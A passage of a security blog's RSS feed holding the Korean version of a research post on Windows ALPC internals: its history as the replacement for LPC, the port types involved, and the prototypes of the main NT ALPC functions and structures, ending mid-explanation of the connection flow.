href="https://processhacker.sourceforge.io/doc/struct___a_l_p_c___s_e_c_u_r_i_t_y___a_t_t_r.html">https://processhacker.sourceforge.io/doc/struct___a_l_p_c___s_e_c_u_r_i_t_y___a_t_t_r.html</a></p></li><li><p><a href="https://ntdoc.m417z.com/">https://ntdoc.m417z.com/</a></p></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Windows/">Windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/IPC/">IPC</category>
      
      <category domain="https://hackyboiz.github.io/tags/gongjae/">gongjae</category>
      
      <category domain="https://hackyboiz.github.io/tags/ALPC/">ALPC</category>
      
      
      <comments>https://hackyboiz.github.io/2025/11/29/gongjae/Windows_ALPC/EN/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] Windows ALPC (KR)</title>
      <link>https://hackyboiz.github.io/2025/11/29/gongjae/Windows_ALPC/KR/</link>
      <guid>https://hackyboiz.github.io/2025/11/29/gongjae/Windows_ALPC/KR/</guid>
      <pubDate>Sat, 29 Nov 2025 12:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h2&gt;&lt;p&gt;&amp;#xC548;&amp;#xB155;&amp;#xD558;&amp;#xC13</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;! &#xC774;&#xBC88;&#xC5D0; HackyBoiz&#xB85C; &#xC0C8;&#xB86D;&#xAC8C; &#xB4E4;&#xC5B4;&#xC628; <code>gongjae</code>&#xB77C;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;! &#x1F47B;</p><p>HackyBoiz &#xACAC;&#xC2B5;&#xC0DD;&#xC2DC;&#xC808;.. &#xC81C;&#xAC00; &#xC9C4;&#xD589;&#xD588;&#xC5C8;&#xB358; Kernel Driver&#xC640; Named Pipe &#xBC84;&#xADF8;&#xD5CC;&#xD305; &#xD504;&#xB85C;&#xC81D;&#xD2B8;&#xC5D0; &#xB300;&#xD55C; &#xC9C8;&#xBB38;&#xC774; &#xD558;&#xB098; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="image.png" alt="image.png"></p><p><del>&#xC544;&#xB2C8;&#xC694;</del></p><p>&#xC0AC;&#xC2E4; ALPC&#xAC00; IPC &#xD1B5;&#xC2E0; &#xBC29;&#xBC95; &#xC911; &#xD558;&#xB098;&#xB77C;&#xB294; &#xAC83;&#xC740; &#xC54C;&#xACE0; &#xC788;&#xC5C8;&#xC9C0;&#xB9CC; &#xC774;&#xBC88; &#xAE30;&#xD68C;&#xC5D0; &#xC81C;&#xB300;&#xB85C; &#xACF5;&#xBD80;&#xD574;&#xBCF4;&#xC790;&#xB294; &#xB9C8;&#xC74C;&#xC73C;&#xB85C; &#xC774; &#xC8FC;&#xC81C;&#xB97C; &#xAC00;&#xC9C0;&#xACE0; &#xC654;&#xC2B5;&#xB2C8;&#xB2E4;!! &#xC624;&#xB298;&#xC740; ALPC&#xC758; &#xAC1C;&#xB150;&#xACFC; &#xD1B5;&#xC2E0; &#xD750;&#xB984;, &#xBA54;&#xC2DC;&#xC9C0;&#xB294; &#xC5B4;&#xB5BB;&#xAC8C; &#xC804;&#xC1A1;&#xB418;&#xB294;&#xC9C0; &#xC9C1;&#xC811; &#xB514;&#xBC84;&#xAE45; &#xD574;&#xBCF4;&#xBA70; &#xC54C;&#xC544;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4; :)</p><p><img src="image%201.png" alt="image.png"></p><h2 id="1-About-ALPC"><a href="#1-About-ALPC" class="headerlink" title="1. About ALPC"></a>1. About ALPC</h2><p>Windows &#xD658;&#xACBD;&#xC5D0;&#xC11C; &#xC6D0;&#xACA9;&#xACFC; &#xB85C;&#xCEEC; &#xBAA8;&#xB450;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xB294; IPC &#xD1B5;&#xC2E0;&#xC740; Named Pipe, RPC &#xB4F1;&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098; ALPC&#xB294; &#xD2B9;&#xC774;&#xD558;&#xAC8C;&#xB3C4; &#xB85C;&#xCEEC;&#xC5D0;&#xC11C;&#xB9CC; &#xC0AC;&#xC6A9; &#xAC00;&#xB2A5;&#xD55C; &#xAE30;&#xC220;&#xC785;&#xB2C8;&#xB2E4;.</p><p>RPC&#xAC00; Remote Procedure Call&#xC744; &#xC758;&#xBBF8;&#xD558;&#xB294; &#xAC83;&#xACFC; &#xB2EC;&#xB9AC;, ALPC&#xB294; Advanced Local Procedure Call&#xC744; &#xB73B;&#xD558;&#xBA70;, &#xB54C;&#xB54C;&#xB85C;&#xB294; Asynchronous(&#xBE44;&#xB3D9;&#xAE30;) Local Call&#xB85C;&#xB3C4; &#xBD88;&#xB9B0;&#xB2F5;&#xB2C8;&#xB2E4;!</p><p>&#xBE44;&#xB3D9;&#xAE30;&#xB77C;&#xB294; &#xBA85;&#xCE6D;&#xC740; Windows Vista &#xC2DC;&#xC808;&#xC744; &#xBC18;&#xC601;&#xD574; Vista&#xC5D0;&#xC11C; &#xAE30;&#xC874;&#xC758; LPC&#xB97C; &#xB300;&#xCCB4;&#xD558;&#xAE30; &#xC704;&#xD574; ALPC&#xB97C; &#xB3C4;&#xC785;&#xD55C; &#xAC83;&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC785;&#xB2C8;&#xB2E4;.</p><p> ALPC&#xB294; &#xBE60;&#xB978; &#xBA54;&#xC2DC;&#xC9C0; &#xD1B5;&#xC2E0;&#xC774; &#xAC00;&#xB2A5;&#xD558;&#xACE0; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xAC04; &#xB370;&#xC774;&#xD130; &#xC1A1;&#xC218;&#xC2E0;&#xC5D0; &#xC0AC;&#xC6A9;&#xB418;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><h3 id="1-1-LPC-to-ALPC"><a href="#1-1-LPC-to-ALPC" class="headerlink" title="1.1. LPC to ALPC"></a>1.1. LPC to ALPC</h3><p><img src="image%202.png" alt="image.png"></p><p>Windows Vista &#xC774;&#xC804; LPC&#xB294; &#xB3D9;&#xC77C;&#xD55C; &#xCEF4;&#xD4E8;&#xD130;&#xC758; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC04; &#xACBD;&#xB7C9; IPC&#xB97C; &#xD1B5;&#xD574; Microsoft Windows NT &#xCEE4;&#xB110;&#xC5D0;&#xC11C; &#xC81C;&#xACF5;&#xD558;&#xB294; &#xBB38;&#xC11C;&#xD654;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xB0B4;&#xBD80; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC04; &#xD1B5;&#xC2E0; &#xAE30;&#xB2A5;&#xC785;&#xB2C8;&#xB2E4;.</p><p>LPC&#xC758; &#xB3D9;&#xAE30;&#xC801; &#xD2B9;&#xC131;&#xC73C;&#xB85C; &#xC778;&#xD574; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xC640;  &#xC11C;&#xBC84;&#xB294; &#xBA54;&#xC2DC;&#xC9C0;&#xAC00; &#xCC98;&#xB9AC;&#xB420; &#xB54C;&#xAE4C;&#xC9C0; &#xC11C;&#xB85C; &#xB300;&#xAE30;&#xD574;&#xC57C;&#xB9CC; &#xD588;&#xACE0;, &#xC774; &#xB54C;&#xBB38;&#xC5D0; &#xC2E4;&#xD589;&#xC774; &#xC9C0;&#xC18D;&#xC801;&#xC73C;&#xB85C; Block &#xB418;&#xB294; &#xBB38;&#xC81C;&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xB530;&#xB77C;&#xC11C; Vista &#xC2DC;&#xC810;&#xBD80;&#xD130; &#xAE30;&#xC874; LPC &#xBA54;&#xCEE4;&#xB2C8;&#xC998;&#xC740; &#xC0AC;&#xC2E4;&#xC0C1; ALPC &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xC7AC;&#xAD6C;&#xD604;&#xB418;&#xC5C8;&#xACE0;, &#xC774;&#xD6C4; &#xBC84;&#xC804;&#xC5D0;&#xC11C;&#xB294; &#xB0B4;&#xBD80;&#xC801;&#xC73C;&#xB85C;ALPC&#xB97C; &#xC911;&#xC2EC;&#xC73C;&#xB85C; IPC&#xAC00; &#xB3D9;&#xC791;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.<br>&#xB2E4;&#xB9CC; LPC &#xAD00;&#xB828; API &#xC790;&#xCCB4;&#xAC00; &#x201C;&#xC644;&#xC804;&#xD788; &#xC0AC;&#xB77C;&#xC9C4; &#xAC83;&#x201D;&#xC740; &#xC544;&#xB2C8;&#xACE0;, &#xB0B4;&#xBD80; &#xAD6C;&#xD604;&#xC774; ALPC&#xB85C; &#xB9AC;&#xB514;&#xB809;&#xC158;&#xB41C;&#xB2E4;&#xACE0; &#xBCF4;&#xB294; &#xAC8C; &#xB354; &#xC815;&#xD655;&#xD569;&#xB2C8;&#xB2E4;. </p><p>&#x1F4A1;&#xC544;&#xB798; &#xC0AC;&#xC9C4;&#xC744; &#xBCF4;&#xBA74; &#xAE30;&#xC874;&#xC5D0; LPC &#xD3EC;&#xD2B8;&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xB358; &#xD568;&#xC218;&#xB294; &#xC720;&#xC9C0;&#xB418;&#xC5C8;&#xC73C;&#xBA70;, &#xD574;&#xB2F9; &#xD568;&#xC218; &#xD638;&#xCD9C;&#xC740; &#xC2E4;&#xC81C;&#xB85C; LPC&#xAC00; &#xC544;&#xB2CC; ALPC &#xD3EC;&#xD2B8;&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xB3C4;&#xB85D; &#xB9AC;&#xB514;&#xB809;&#xC158;&#xD558;&#xACE0; &#xC788;&#xC8E0; @.@</p><p><img src="image%203.png" alt="image.png"></p><h3 id="1-2-ALPC-&#xB0B4;&#xBD80;-&#xAD6C;&#xC870;"><a href="#1-2-ALPC-&#xB0B4;&#xBD80;-&#xAD6C;&#xC870;" class="headerlink" title="1.2. ALPC &#xB0B4;&#xBD80; &#xAD6C;&#xC870;"></a>1.2. ALPC &#xB0B4;&#xBD80; &#xAD6C;&#xC870;</h3><p>APLC &#xD1B5;&#xC2E0;&#xC758; &#xC8FC;&#xC694; &#xAD6C;&#xC131; &#xC694;&#xC18C;&#xB294; ALPC &#xD3EC;&#xD2B8; &#xAC1D;&#xCCB4;&#xC774;&#xBA70;, &#xC0AC;&#xC6A9;&#xBC95;&#xC740; &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xC18C;&#xCEA3;&#xACFC; &#xC720;&#xC0AC;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#x2192; &#xC11C;&#xBC84;&#xAC00; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xC640; &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xAD50;&#xD658;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC5F0;&#xACB0;&#xD560; &#xC218; &#xC788;&#xB294; &#xC18C;&#xCEA3;&#xC744; &#xC5EC;&#xB294; &#xAC83;</p><p>Sysinternals Suite&#xC758; WinObj.exe&#xB97C; &#xD1B5;&#xD574; ALPC &#xD3EC;&#xD2B8;&#xB4E4;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xB294;&#xB370;&#xC694;!</p><p><img src="image%204.png" alt="image.png"></p><p>&#xB8E8;&#xD2B8; &#xACBD;&#xB85C;&#xC5D0;&#xB3C4; ALPC &#xD3EC;&#xD2B8;&#xAC00; &#xC788;&#xC9C0;&#xB9CC;, &#xB300;&#xBD80;&#xBD84;&#xC740; \RPC Control &#xACBD;&#xB85C;&#xC5D0; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;.</p><p>ALPC &#xD1B5;&#xC2E0;&#xC5D0;&#xB294; &#xCD1D; 3&#xAC1C;&#xC758; ALPC port(&#xC11C;&#xBC84;&#xCE21; 2&#xAC1C;, &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xCE21; 1&#xAC1C;)&#xAC00; &#xAD00;&#xC5EC;&#xD558;&#xAC8C; &#xB418;&#xB294;&#xB370;, &#xC704; WinObj &#xC0AC;&#xC9C4;&#xC5D0;&#xC11C; &#xBCF4;&#xC778; ALPC &#xD3EC;&#xD2B8;&#xB4E4;&#xC740; ALPC Communication Port&#xB85C; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xAC00; &#xC5F0;&#xACB0;&#xD560; &#xC218; &#xC788;&#xB294; &#xD3EC;&#xD2B8;&#xC785;&#xB2C8;&#xB2E4;.</p><p>ALPC &#xD1B5;&#xC2E0;&#xC5D0; &#xB300;&#xD574; &#xC124;&#xBA85;&#xD558;&#xAE30; &#xC804;&#xC5D0;, &#xACC4;&#xC18D;&#xD574;&#xC11C; &#xBCF4;&#xAC8C; &#xB420; &#xD568;&#xC218; &#xBA87;&#xAC1C;&#xB97C; &#xBA3C;&#xC800; &#xC9DA;&#xACE0; &#xB118;&#xC5B4;&#xAC00;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><blockquote><p><strong>NtAlpcCreatePort()</strong></p></blockquote><pre><code class="hljs cpp"><span class="hljs-function">NTSTATUS NTAPI <span class="hljs-title">NtAlpcCreatePort</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">    OUT PHANDLE PortHandle,</span></span><span class="hljs-function"><span class="hljs-params">    IN POBJECT_ATTRIBUTES ObjectAttributes,</span></span><span class="hljs-function"><span class="hljs-params">    IN OUT PALPC_INFO PortInformation OPTIONAL</span></span><span class="hljs-function"><span class="hljs-params">)</span></span>;</code></pre><ul><li>&#xC774; &#xD568;&#xC218;&#xB294; ALPC &#xD3EC;&#xD2B8;&#xB97C; &#xC0DD;&#xC131;&#xD560; &#xB54C; &#xC0AC;&#xC6A9;&#xD558;&#xBA70;, &#xD3EC;&#xD2B8; &#xC0DD;&#xC131; &#xBC29;&#xC2DD;&#xC740; &#xAE30;&#xC874; LPC&#xC640; &#xD06C;&#xAC8C; &#xB2E4;&#xB974;&#xC9C0; &#xC54A;&#xC9C0;&#xB9CC; &#xC635;&#xC158;&#xB4E4;&#xC744; &#xB530;&#xB85C; &#xB098;&#xC5F4;&#xD558;&#xB294; &#xB300;&#xC2E0; ALPC_INFO &#xAD6C;&#xC870;&#xCCB4;&#xB85C; &#xBB36;&#xC5B4;&#xC11C; &#xB9C8;&#xC9C0;&#xB9C9; &#xC778;&#xC790;&#xB85C; &#xBCF4;&#xB0B4;&#xB294;&#xAC8C; &#xD2B9;&#xC9D5;!</li><li>&#xC774; &#xAD6C;&#xC870;&#xCCB4;&#xB294; &#xD3EC;&#xD2B8; &#xC0DD;&#xC131; &#xC2DC; ALPC &#xAC1D;&#xCCB4;&#xC5D0; &#xBCF5;&#xC0AC;&#xB418;&#xC5B4; &#xCD94; &#xD6C4;&#xC5D0; &#xB0B4;&#xBD80;&#xC5D0;&#xC11C; &#xCC38;&#xC870;</li></ul><pre><code class="hljs cpp"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">ALPC_INFO</span></span><span class="hljs-class">{</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PORT_INFO_LPCMODE               0x001000 <span class="hljs-comment">// LPC &#xD3EC;&#xD2B8;&#xCC98;&#xB7FC; &#xB3D9;&#xC791;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PORT_INFO_CANIMPERSONATE        0x010000 <span class="hljs-comment">// &#xC784;&#xD37C;&#xC18C;&#xB124;&#xC774;&#xC158; &#xD5C8;&#xC6A9;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PORT_INFO_REQUEST_ALLOWED       0x020000 <span class="hljs-comment">// &#xBA54;&#xC2DC;&#xC9C0; &#xD5C8;&#xC6A9;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PORT_INFO_SEMAPHORE             0x040000 <span class="hljs-comment">// &#xB3D9;&#xAE30;&#xD654; &#xC2DC;&#xC2A4;&#xD15C;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PORT_INFO_HANDLE_EXPOSE         0x080000 <span class="hljs-comment">// &#xD578;&#xB4E4; &#xB178;&#xCD9C; &#xD5C8;&#xC6A9;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PORT_INFO_PARENT_SYSTEM_PROCESS 0x100000 <span class="hljs-comment">// &#xCEE4;&#xB110; ALPC &#xC778;&#xD130;&#xD398;&#xC774;&#xC2A4;</span></span>    ULONG Flags;    SECURITY_QUALITY_OF_SERVICE PortQos;    ULONG MaxMessageSize;    ULONG unknown1;    CHAR  cReserved1[<span class="hljs-number">8</span>];    ULONG MaxViewSize;    CHAR  cReserved2[<span class="hljs-number">8</span>];} ALPC_INFO, *PALPC_INFO;</code></pre><blockquote><p><strong>NtAlpcConnectPort()</strong></p></blockquote><pre><code class="hljs cpp"><span class="hljs-function">NTSTATUS NTAPI <span class="hljs-title">NtAlpcConnectPort</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">    OUT PHANDLE PortHandle,</span></span><span class="hljs-function"><span class="hljs-params">    IN PUNICODE_STRING PortName,</span></span><span class="hljs-function"><span class="hljs-params">    IN POBJECT_ATTRIBUTES ObjectAttributes,</span></span><span class="hljs-function"><span class="hljs-params">    IN PALPC_INFO PortInformation OPTIONAL,</span></span><span class="hljs-function"><span class="hljs-params">    IN DWORD ConnectionFlags,</span></span><span class="hljs-function"><span class="hljs-params">    IN PSID pSid OPTIONAL,</span></span><span class="hljs-function"><span class="hljs-params">    IN PLPC_MESSAGE ConnectionMessage OPTIONAL,</span></span><span class="hljs-function"><span class="hljs-params">    IN OUT PULONG ConnectMessageSize OPTIONAL,</span></span><span class="hljs-function"><span class="hljs-params">    IN PVOID InMessageBuffer OPTIONAL,</span></span><span class="hljs-function"><span class="hljs-params">    IN PVOID OutMessageBuffer OPTIONAL,</span></span><span class="hljs-function"><span class="hljs-params">    IN PLARGE_INTEGER Timeout OPTIONAL</span></span><span class="hljs-function"><span class="hljs-params">)</span></span>;</code></pre><ul><li>PortName&#xC73C;&#xB85C; &#xC5F0;&#xACB0;&#xD558;&#xB824;&#xB294; &#xD3EC;&#xD2B8; &#xC774;&#xB984;, &#xAC01;&#xC885; &#xC635;&#xC158;&#xB4E4;&#xC744; &#xB123;&#xC744; &#xC218; &#xC788;&#xACE0; &#xCEE4;&#xB110;&#xC774; &#xD574;&#xB2F9; &#xC774;&#xB984;&#xC758; ALPC Connection Port &#xAC1D;&#xCCB4;&#xB97C; &#xD0D0;&#xC0C9;&#xD558;&#xACE0; &#xCD94;&#xD6C4;&#xC5D0; &#xC5F0;&#xACB0;&#xC744; &#xC694;&#xCCAD;</li></ul><p><strong>ConnectionFlags &#xC911;&#xC694; Flag</strong></p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> ALPC_SYNC_CONNECTION   0x020000 <span class="hljs-comment">// &#xB3D9;&#xAE30;&#xC2DD; &#xC5F0;&#xACB0;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> ALPC_USER_WAIT_MODE    0x100000 <span class="hljs-comment">// &#xC720;&#xC800; &#xBAA8;&#xB4DC;&#xC5D0;&#xC11C; Wait</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> ALPC_WAIT_IS_ALERTABLE 0x200000 <span class="hljs-comment">// Alertable wait</span></span></code></pre><ul><li>default &#xAC12;&#xC73C;&#xB85C;&#xB294; &#xBE44;&#xB3D9;&#xAE30; &#xC5F0;&#xACB0;(Async)<ul><li>&#xC5F0;&#xACB0; &#xC694;&#xCCAD;&#xC744; &#xC11C;&#xBC84;&#xAC00; &#xCC98;&#xB9AC;&#xD574;&#xC11C; &#xC2E4;&#xC81C;&#xB85C; &#xBC1B;&#xC544;&#xB4E4;&#xC774;&#xAE30; &#xC804;&#xC5D0;, &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xB294; &#xD578;&#xB4E4;&#xC744; &#xD558;&#xB098; &#xBC1B;&#xC544;&#xBC84;&#xB9B4; &#xC218; &#xC788;&#xC74C;</li><li>&#xB9CC;&#xC57D; &#xC11C;&#xBC84;&#xAC00; &#xC544;&#xC9C1; &#xC5F0;&#xACB0; &#xC694;&#xCCAD;&#xC744; &#xCC98;&#xB9AC;&#xD558;&#xC9C0; &#xC54A;&#xC740; &#xC0C1;&#xD0DC;&#xC5D0;&#xC11C; &#xD074;&#xB77C;&#xC774;&#xC5CD;&#xB290;&#xAC00; &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xBCF4;&#xB0B4;&#xBA74; &#xC5D0;&#xB7EC;&#xAC00; &#xB0A0; &#xC218; &#xC788;&#xC74C;</li></ul></li></ul><blockquote><p><strong>NtAlpcSendWaitReceivePort()</strong></p></blockquote><pre><code class="hljs cpp"><span class="hljs-function">NTSTATUS <span class="hljs-title">NtAlpcSendWaitReceivePort</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">    HANDLE PortHandle,</span></span><span class="hljs-function"><span class="hljs-params">    DWORD Flags,</span></span><span class="hljs-function"><span class="hljs-params">    PPORT_MESSAGE SendMessage,</span></span><span class="hljs-function"><span class="hljs-params">    PALPC_MESSAGE_ATTRIBUTES SendMessageAttributes,</span></span><span class="hljs-function"><span class="hljs-params">    PPORT_MESSAGE ReceiveMessage,</span></span><span class="hljs-function"><span class="hljs-params">    PSIZE_T BufferLength,</span></span><span class="hljs-function"><span class="hljs-params">    PALPC_MESSAGE_ATTRIBUTES ReceiveMessageAttributes,</span></span><span class="hljs-function"><span class="hljs-params">    PLARGE_INTEGER Timeout</span></span><span class="hljs-function"><span class="hljs-params">)</span></span>;</code></pre><ul><li>&#xAC00;&#xC7A5; &#xC911;&#xC694;&#xD55C; &#xD568;&#xC218;&#xB85C;, &#xC774; &#xD568;&#xC218; &#xD558;&#xB098;&#xB85C; &#xBA54;&#xC2DC;&#xC9C0; &#xBCF4;&#xB0B4;&#xAE30;, &#xBC1B;&#xAE30; &#xB3D9;&#xC2DC;&#xC5D0; &#xAC00;&#xB2A5;!!</li><li>SendMessage, ReciveBuffer&#xB294; &#xB9D0; &#xADF8;&#xB300;&#xB85C; &#xC1A1;/&#xC218;&#xC2E0; &#xBA54;&#xC2DC;&#xC9C0; &#xBC84;&#xD37C;</li><li>InMessageBuffer, OutMessageBuffer&#xB294; &#xBA54;&#xC2DC;&#xC9C0;&#xC640; &#xD568;&#xAED8; &#xCD94;&#xAC00; &#xC561;&#xC158;(&#xC139;&#xC158; &#xB9E4;&#xD551;, &#xD578;&#xB4E4; &#xC804;&#xB2EC; &#xB4F1;)&#xC744; &#xC694;&#xCCAD;/&#xC751;&#xB2F5;&#xD558;&#xB294;&#xB370; &#xC4F0;&#xC784;</li></ul><h2 id="2-ALPC-&#xD1B5;&#xC2E0;-&#xD750;&#xB984;"><a href="#2-ALPC-&#xD1B5;&#xC2E0;-&#xD750;&#xB984;" class="headerlink" title="2. ALPC &#xD1B5;&#xC2E0; &#xD750;&#xB984;"></a>2. ALPC &#xD1B5;&#xC2E0; &#xD750;&#xB984;</h2><p>&#xC88B;&#xC544;&#xC694;, &#xB300;&#xCDA9; &#xD568;&#xC218;&#xB4E4;&#xC774; &#xC5B4;&#xB5A4; &#xC5ED;&#xD560;&#xC744; &#xD558;&#xB294;&#xC9C0; &#xC54C;&#xC558;&#xC73C;&#xB2C8;, &#xC81C;&#xB300;&#xB85C;&#xB41C; &#xD1B5;&#xC2E0; &#xD750;&#xB984;&#xC744; &#xC54C;&#xC544;&#xBCFC;&#xAE4C;&#xC694;? &#xC55E;&#xC11C; ALPC &#xD1B5;&#xC2E0; &#xC2DC;&#xB098;&#xB9AC;&#xC624;&#xC5D0;&#xC11C; 3&#xAC1C;&#xC758; ALPC &#xD3EC;&#xD2B8;&#xB97C; &#xC0AC;&#xC6A9;&#xD55C;&#xB2E4;&#xACE0; &#xD588;&#xC5C8;&#xC8E0;! </p><ol><li>&#xC11C;&#xBC84; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; &#xC0DD;&#xC131;&#xD558;&#xB294; ALPC connection port</li><li>&#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xAC00; &#xC5F0;&#xACB0;&#xD560; &#xB54C; &#xCEE4;&#xB110;&#xC774; &#xC0C8;&#xB85C; &#xB9CC;&#xB4DC;&#xB294; ALPC server communication port</li><li>ALPC client communication port</li></ol><p>&#xC774;&#xB807;&#xAC8C; 3&#xAC00;&#xC9C0;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294;&#xB370;&#xC694;, &#xC774;&#xB807;&#xAC8C;&#xB9CC; &#xBCF4;&#xBA74; &#xBB34;&#xC2A8; &#xC18C;&#xB9AC;&#xC778;&#xC9C0; &#xC774;&#xD574;&#xAC00; &#xC798; &#xC548;&#xB418;&#xC8E0;..? <del>&#xC804; &#xADF8;&#xB7AC;&#xC2B5;&#xB2C8;&#xB2E4;&#x3160;</del></p><p>&#xC0AC;&#xC2E4; ALPC &#xD1B5;&#xC2E0; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xB17C;&#xB9AC;&#xC801;&#xC73C;&#xB85C; 3&#xAC1C;&#xC758; &#xD3EC;&#xD2B8;&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xAC83;&#xCC98;&#xB7FC; &#xBCF4;&#xC774;&#xC9C0;&#xB9CC;, &#xC2E4;&#xC81C;&#xB85C;&#xB294; &#xD558;&#xB098;&#xC758; ALPC &#xD3EC;&#xD2B8; &#xAC1D;&#xCCB4;&#xB97C; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xC5EC;&#xB7EC; &#xC5D4;&#xB4DC;&#xD3EC;&#xC778;&#xD2B8;&#xAC00; &#xC0DD;&#xC131;&#xB418;&#xB294; &#xAD6C;&#xC870;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xC81C; &#xD1B5;&#xC2E0; &#xD750;&#xB984;&#xC744; &#xC21C;&#xC11C;&#xB300;&#xB85C; &#xC9DA;&#xC5B4;&#xAC00;&#xBA70; &#xC774;&#xD574;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;!</p><p><img src="image%205.png" alt="[&#xBAA8;&#xB4E0; &#xAC83;&#xC744; &#xD0C0;&#xD611;&#xD558;&#xAE30; &#xC704;&#xD574; N&#xC77C; &#xCCB4;&#xC778;: 2&#xBD80; &#x2014; Windows &#xCEE4;&#xB110; LPE (&#xC77C;&#xBA85; &#xD06C;&#xB86C; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; Escape) - Theori BLOG](https://theori.io/blog/chaining-n-days-to-compromise-all-part-2-windows-kernel-lpe-a-k-a-chrome-sandbox-escape)"></p><p><a href="https://theori.io/blog/chaining-n-days-to-compromise-all-part-2-windows-kernel-lpe-a-k-a-chrome-sandbox-escape">&#xBAA8;&#xB4E0; &#xAC83;&#xC744; &#xD0C0;&#xD611;&#xD558;&#xAE30; &#xC704;&#xD574; N&#xC77C; &#xCCB4;&#xC778;: 2&#xBD80; &#x2014; Windows &#xCEE4;&#xB110; LPE (&#xC77C;&#xBA85; &#xD06C;&#xB86C; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; Escape) - Theori BLOG</a></p><p>&#xAC00;&#xC7A5; &#xC8FC;&#xBAA9;&#xD560; &#xD568;&#xC218;&#xB294; &#xC5ED;&#xC2DC;&#xB098; <code>NtAlpcSendWaitReceivePort()</code> &#xD568;&#xC218;&#xC785;&#xB2C8;&#xB2E4;. &#xC0AC;&#xC2E4;&#xC0C1; &#xC774; &#xD568;&#xC218;&#xAC00; &#xC694;&#xCCAD;&#xC774;&#xB098; &#xC2B9;&#xC778;&#xC744; &#xC8FC;&#xACE0;&#xBC1B;&#xB294; &#xC5ED;&#xD560;&#xC744; &#xC804;&#xBD80; &#xD574;&#xC8FC;&#xAE30; &#xB54C;&#xBB38;&#xC774;&#xC8E0;! &#xC21C;&#xC11C;&#xB300;&#xB85C; &#xD750;&#xB984;&#xC744; &#xB9D0;&#xD558;&#xC790;&#xBA74; &#xC774;&#xB807;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li>&#xC11C;&#xBC84; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; <code>NtAlpcCreatePort()</code> &#xB97C; &#xD638;&#xCD9C;&#xD558;&#xC5EC; ALPC &#xD3EC;&#xD2B8;&#xB97C; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;.<ul><li>&#xC774;&#xB984; &#xC608;&#xC2DC; : &#x201C;\RPC Control\HackyBoiz&#x201D;</li></ul></li><li><p>&#xCEE4;&#xB110;&#xC740; ALPC &#xD3EC;&#xD2B8; &#xAC1D;&#xCCB4;&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xACE0; &#xC11C;&#xBC84;&#xC5D0;&#xC138; &#xD578;&#xB4E4;&#xC744; 